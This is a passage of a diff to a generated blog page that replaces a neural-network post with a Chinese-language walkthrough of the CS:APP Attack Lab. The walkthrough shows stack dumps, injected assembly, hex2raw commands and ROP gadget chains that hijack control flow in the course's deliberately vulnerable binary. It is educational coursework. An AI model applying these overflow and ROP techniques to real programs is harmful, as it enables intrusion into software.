+<span class="line"><span class="number">0048</span>| <span class="number">0x5561dca8</span> --&gt; <span class="number">0x4017ec</span> (&lt;touch2&gt;:	sub    $<span class="number">0x8</span>,%rsp)</span>
+<span class="line"><span class="number">0056</span>| <span class="number">0x5561dcb0</span> --&gt; <span class="number">0xc359b997fac7c748</span></span>
+</pre></td></tr></table></figure>
+<p>依旧是40个a，接着是把返回的地址改为调用0x5561dcb0（修改寄存器的代码），修改0x5561dca8的值为调用touch2，修改0x5561dcb0的值为调用添加的代码code<br>
+栈的指针指向0040调用完code之后，刚好向下移动到0048调用touch2</p>
+<p>code代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<span class="line">2</span>
+</pre></td><td class="code"><pre><span class="line">mov $<span class="number">0x59b997fa</span>,%rdi</span>
+<span class="line">ret</span>
+</pre></td></tr></table></figure>
+<p>编译：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<span class="line">2</span>
+<span class="line">3</span>
+</pre></td><td class="code"><pre><span class="line">gcc -c code.s</span>
+<span class="line">objdump -d code.o &gt; code.d</span>
+<span class="line">./hex2raw  -i code.d &gt; code.r</span>
+</pre></td></tr></table></figure>
+<p>看到网上的码还有一步pushq $0x004017ec  （touch2的地址）<br>
+结果：<br>
+ret时返回到0x5561dc78（%rsp的地址？）执行注入的代码，然后直接调用touch2了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<span class="line">2</span>
+<span class="line">3</span>
+<span class="line">4</span>
+<span class="line">5</span>
+<span class="line">6</span>
+<span class="line">7</span>
+<span class="line">8</span>
+<span class="line">9</span>
+</pre></td><td class="code"><pre><span class="line">[-----------------------<span class="built_in">stack</span>-------------------------]</span>
+<span class="line"><span class="number">0000</span>| <span class="number">0x5561dc78</span> --&gt; <span class="number">0x6859b997fac7c748</span> </span>
+<span class="line"><span class="number">0008</span>| <span class="number">0x5561dc80</span> --&gt; <span class="number">0x303030c3004017ec</span> </span>
+<span class="line"><span class="number">0016</span>| <span class="number">0x5561dc88</span> (<span class="string">'0'</span> &lt;repeats <span class="number">24</span> times&gt;, <span class="string">"x\334aU"</span>)</span>
+<span class="line"><span class="number">0024</span>| <span class="number">0x5561dc90</span> (<span class="string">'0'</span> &lt;repeats <span class="number">16</span> times&gt;, <span class="string">"x\334aU"</span>)</span>
+<span class="line"><span class="number">0032</span>| <span class="number">0x5561dc98</span> (<span class="string">"00000000x\334aU"</span>)</span>
+<span class="line"><span class="number">0040</span>| <span class="number">0x5561dca0</span> --&gt; <span class="number">0x5561dc78</span> --&gt; <span class="number">0x6859b997fac7c748</span> </span>
+<span class="line"><span class="number">0048</span>| <span class="number">0x5561dca8</span> --&gt; <span class="number">0x0</span> </span>
+<span class="line"><span class="number">0056</span>| <span class="number">0x5561dcb0</span> --&gt; <span class="number">0x401f24</span> (&lt;launch+<span class="number">112</span>&gt;:	cmpl   $<span class="number">0x0</span>,<span class="number">0x2025bd</span>(%rip)        # <span class="number">0x6044e8</span> &lt;is_checker&gt;)</span>
+</pre></td></tr></table></figure>
+<h3 id="phase-3"><a class="markdownIt-Anchor" href="#phase-3"></a> Phase 3</h3>
+<p>touch3参数是string<br>
+将str存到0x5561dcb8的地址上<br>
+code将str拷贝到%rdi<br>
+调用同上</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<span class="line">2</span>
+<span class="line">3</span>
+<span class="line">4</span>
+<span class="line">5</span>
+<span class="line">6</span>
+<span class="line">7</span>
+<span class="line">8</span>
+<span class="line">9</span>
+</pre></td><td class="code"><pre><span class="line">[-----------------------<span class="built_in">stack</span>-------------------------]</span>
+<span class="line"><span class="number">0000</span>| <span class="number">0x5561dc78</span> (<span class="string">'a'</span> &lt;repeats <span class="number">40</span> times&gt;)</span>
+<span class="line"><span class="number">0008</span>| <span class="number">0x5561dc80</span> (<span class="string">'a'</span> &lt;repeats <span class="number">32</span> times&gt;)</span>
+<span class="line"><span class="number">0016</span>| <span class="number">0x5561dc88</span> (<span class="string">'a'</span> &lt;repeats <span class="number">24</span> times&gt;)</span>
+<span class="line"><span class="number">0024</span>| <span class="number">0x5561dc90</span> (<span class="string">'a'</span> &lt;repeats <span class="number">16</span> times&gt;)</span>
+<span class="line"><span class="number">0032</span>| <span class="number">0x5561dc98</span> (<span class="string">"aaaaaaaa"</span>)</span>
+<span class="line"><span class="number">0040</span>| <span class="number">0x5561dca0</span> --&gt; <span class="number">0x401900</span> (&lt;touch3+<span class="number">6</span>&gt;:	(bad))</span>
+<span class="line"><span class="number">0048</span>| <span class="number">0x5561dca8</span> --&gt; <span class="number">0x9</span> (<span class="string">'\t'</span>)</span>
+<span class="line"><span class="number">0056</span>| <span class="number">0x5561dcb0</span> --&gt; <span class="number">0x401f24</span> (&lt;launch+<span class="number">112</span>&gt;:	)</span>
+</pre></td></tr></table></figure>
+<p>str是cookie的地址值用ascii转为字符串<br>
+（0x）59b997fa<br>
+对应35 39 62 39 39 37 66 61 00（字符串后面补空字符’\0’）</p>
+<p>code代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<span class="line">2</span>
+</pre></td><td class="code"><pre><span class="line">mov $<span class="number">0x5561dcb8</span>,%rdi</span>
+<span class="line">ret</span>
+</pre></td></tr></table></figure>
+<h2 id="part2-rop"><a class="markdownIt-Anchor" href="#part2-rop"></a> Part2: ROP</h2>
+<h3 id="phase-4"><a class="markdownIt-Anchor" href="#phase-4"></a> Phase 4</h3>
+<p>看了看文档，解释的很清楚w<br>
+利用已经有的代码片段gadget，通过汇编的解释，来调用自己想要执行的程序</p>
+<p>第一个程序还是调用touch2<br>
+要将cookiee放入rdi之中<br>
+但pop %rdi（5f）的指令很少出现<br>
+所以转换为</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<span class="line">2</span>
+<span class="line">3</span>
+</pre></td><td class="code"><pre><span class="line">popq <span class="symbol">%rax</span></span>
+<span class="line">movq <span class="symbol">%rax</span> <span class="symbol">%rdi</span></span>
+<span class="line"><span class="keyword">ret</span></span>
+</pre></td></tr></table></figure>
+<p>根据表里的编码<br>
+popq %rax的编码是58<br>
+movq %rax %rdi的编码是48 89 c7</p>
+<p>在rtarget.d里找到这两个代码片段</p>
+<p>#####gadget1</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<span class="line">2</span>
+<span class="line">3</span>
+</pre></td><td class="code"><pre><span class="line"><span class="number">00000000004019</span>a7 &lt;addval_219&gt;:</span>
+<span class="line">  <span class="number">4019</span>a7:	<span class="number">8</span>d <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> <span class="number">58</span> <span class="number">90</span>    	lea    <span class="number">-0x6fa78caf</span>(%rdi),%eax</span>
+<span class="line">  <span class="number">4019</span>ad:	c3                   	retq</span>
+</pre></td></tr></table></figure>
+<p>地址为0x4019ab</p>
+<p>#####gadget2</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<span class="line">2</span>
+<span class="line">3</span>
+<span class="line">4</span>
+<span class="line">5</span>
+<span class="line">6</span>
+<span class="line">7</span>
+</pre></td><td class="code"><pre><span class="line"><span class="number">00000000004019</span>a0 &lt;addval_273&gt;:</span>
+<span class="line">  <span class="number">4019</span>a0:	<span class="number">8</span>d <span class="number">87</span> <span class="number">48</span> <span class="number">89</span> c7 c3    	lea    <span class="number">-0x3c3876b8</span>(%rdi),%eax</span>
+<span class="line">  <span class="number">4019</span>a6:	c3                   	retq  </span>
+<span class="line"></span>
+<span class="line"><span class="number">00000000004019</span>ae &lt;setval_237&gt;:</span>
+<span class="line">  <span class="number">4019</span>ae:	c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 c7    	movl   $<span class="number">0xc7c78948</span>,(%rdi)</span>
+<span class="line">  <span class="number">4019b</span>4:	c3                   	retq</span>
+</pre></td></tr></table></figure>
+<p>273的地址是0x4019a2</p>
+<p>转化为little endian的形式然后就是合并，转换为字符串注入</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<span class="line">2</span>
+</pre></td><td class="code"><pre><span class="line">cat offeset gadget1 cookiee gadget2 touch2 &gt; code</span>
+<span class="line">./hex2raw -i code &gt; code.r</span>
+</pre></td></tr></table></figure>
+<p>然后就成功了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<span class="line">2</span>
+<span class="line">3</span>
+<span class="line">4</span>
+<span class="line">5</span>
+<span class="line">6</span>
+<span class="line">7</span>
+<span class="line">8</span>
+<span class="line">9</span>
+<span class="line">10</span>
+</pre></td><td class="code"><pre><span class="line">[---------------<span class="built_in">stack</span>----------------------]</span>
+<span class="line"><span class="number">0000</span>| <span class="number">0x7ffffffee8a0</span> (<span class="string">'a'</span> &lt;repeats <span class="number">40</span> times&gt;, <span class="string">"\253\031@"</span>)</span>
+<span class="line"><span class="number">0008</span>| <span class="number">0x7ffffffee8a8</span> (<span class="string">'a'</span> &lt;repeats <span class="number">32</span> times&gt;, <span class="string">"\253\031@"</span>)</span>
+<span class="line"><span class="number">0016</span>| <span class="number">0x7ffffffee8b0</span> (<span class="string">'a'</span> &lt;repeats <span class="number">24</span> times&gt;, <span class="string">"\253\031@"</span>)</span>
+<span class="line"><span class="number">0024</span>| <span class="number">0x7ffffffee8b8</span> (<span class="string">'a'</span> &lt;repeats <span class="number">16</span> times&gt;, <span class="string">"\253\031@"</span>)</span>
+<span class="line"><span class="number">0032</span>| <span class="number">0x7ffffffee8c0</span> (<span class="string">"aaaaaaaa\253\031@"</span>)</span>
+<span class="line"><span class="number">0040</span>| <span class="number">0x7ffffffee8c8</span> --&gt; <span class="number">0x4019ab</span> (&lt;addval_219+<span class="number">4</span>&gt;:	pop    %rax)</span>
+<span class="line"><span class="number">0048</span>| <span class="number">0x7ffffffee8d0</span> --&gt; <span class="number">0x59b997fa</span> </span>
+<span class="line"><span class="number">0056</span>| <span class="number">0x7ffffffee8d8</span> --&gt; <span class="number">0x4019a2</span> (&lt;addval_273+<span class="number">2</span>&gt;:	mov    %rax,%rdi)</span>
+<span class="line"><span class="number">0064</span>| <span class="number">0x7ffffffee8e0</span> --&gt; <span class="number">0x4017ec</span> (&lt;touch2&gt;:	sub    $<span class="number">0x8</span>,%rsp)</span>
+</pre></td></tr></table></figure>
+<p>一开始试了237，但不知道为什么这个返回的时候返回到了别的函数导致segmentation fault</p>
 
       
     </div>
@@ -719,7 +658,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/NeuralNet/" rel="tag"><i class="fa fa-tag"></i> NeuralNet</a>
+            <a href="/tags/CSAPP/" rel="tag"><i class="fa fa-tag"></i> CSAPP</a>
           
         </div>
       
@@ -732,18 +671,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/15/NeuralNet/2/" rel="next" title="[NN&DL-ch2] How the backpropagation algorithm works">
-                <i class="fa fa-chevron-left"></i> [NN&DL-ch2] How the backpropagation algorithm works
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/04/18/SICP/sicp3/" rel="prev" title="[SICP-ch3] Modularity, Objects, and State">
-                [SICP-ch3] Modularity, Objects, and State <i class="fa fa-chevron-right"></i>
+              <a href="/2017/12/10/ACM/kuangbin-4/" rel="prev" title="kuangbin专题四 最短路">
+                kuangbin专题四 最短路 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -906,7 +841,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ch-3-improving-the-way-neural-networks-learn"><span class="nav-number">1.</span> <span class="nav-text"> ch-3 Improving the way neural networks learn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#the-cross-entropy-cost-function"><span class="nav-number">1.1.</span> <span class="nav-text"> The cross-entropy cost function</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#softmax"><span class="nav-number">1.2.</span> <span class="nav-text"> Softmax</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#overfitting"><span class="nav-number">1.3.</span> <span class="nav-text"> Overfitting</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#regularization"><span class="nav-number">1.4.</span> <span class="nav-text"> Regularization</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#l2-regularization-weight-decay"><span class="nav-number">1.4.1.</span> <span class="nav-text"> L2 regularization ( weight decay )</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#l1-regularization"><span class="nav-number">1.4.2.</span> <span class="nav-text"> L1 regularization</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dropout"><span class="nav-number">1.4.3.</span> <span class="nav-text"> Dropout</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#artificially-expanding-the-training-data"><span class="nav-number">1.4.4.</span> <span class="nav-text"> Artificially expanding the training data</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#weight-initialization"><span class="nav-number">1.5.</span> <span class="nav-text"> Weight initialization</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#handwriting-recognition-revisited-the-code"><span class="nav-number">1.6.</span> <span class="nav-text"> Handwriting recognition revisited: the code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#how-to-choose-a-neural-networks-hyper-parameters"><span class="nav-number">1.7.</span> <span class="nav-text"> How to choose a neural network’s hyper-parameters?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#other-techniques"><span class="nav-number">1.8.</span> <span class="nav-text"> Other techniques</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#other-models-of-artificial-neuron"><span class="nav-number">1.8.1.</span> <span class="nav-text"> Other models of artificial neuron</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#csapp-ch3-attack-lab"><span class="nav-number">1.</span> <span class="nav-text"> [CS:APP-ch3] Attack Lab</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#part-1缓冲区溢出攻击"><span class="nav-number">2.</span> <span class="nav-text"> Part 1：缓冲区溢出攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-1"><span class="nav-number">2.1.</span> <span class="nav-text"> Phase  1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-2"><span class="nav-number">2.2.</span> <span class="nav-text"> Phase 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-3"><span class="nav-number">2.3.</span> <span class="nav-text"> Phase 3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#part2-rop"><span class="nav-number">3.</span> <span class="nav-text"> Part2: ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-4"><span class="nav-number">3.1.</span> <span class="nav-text"> Phase 4</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -1153,9 +1088,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://yoursite.com/2018/04/15/NeuralNet/3/';
-          this.page.identifier = '2018/04/15/NeuralNet/3/';
-          this.page.title = '[NN&DL-ch3] Improving the way neural networks learn';
+          this.page.url = 'http://yoursite.com/2017/08/30/CSAPP/attack/';
+          this.page.identifier = '2017/08/30/CSAPP/attack/';
+          this.page.title = '[CS:APP-ch3] Attack Lab';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://aria-3.disqus.com/embed.js';
